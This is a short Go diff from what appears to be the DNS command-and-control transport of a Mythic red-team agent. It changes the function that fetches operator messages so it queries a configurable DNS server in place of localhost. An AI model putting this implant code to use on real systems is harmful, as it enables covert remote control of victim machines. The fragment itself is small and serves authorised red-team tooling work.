@@ -811,7 +811,7 @@ func (c *C2DNS) getDNSMessageFromServer(messageID uint32) []byte {
 			//utils.PrintDebug(fmt.Sprintf("get message From Mythic: chunk: %d, domain: %s\n", lastChunk, dns.Fqdn(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("Total domain length: %d\n", len(finalData+domain)))
 			//utils.PrintDebug(fmt.Sprintf("%v\n", m))
-			response, _, err := dnsClient.Exchange(m, "127.0.0.1:53")
+			response, _, err := dnsClient.Exchange(m, c.DNSServer)
 			if err != nil {
 				utils.PrintDebug(fmt.Sprintf("failed to send message and get response for chunk (%d): %v\n", lastChunk, err))
 				time.Sleep(1 * time.Second)
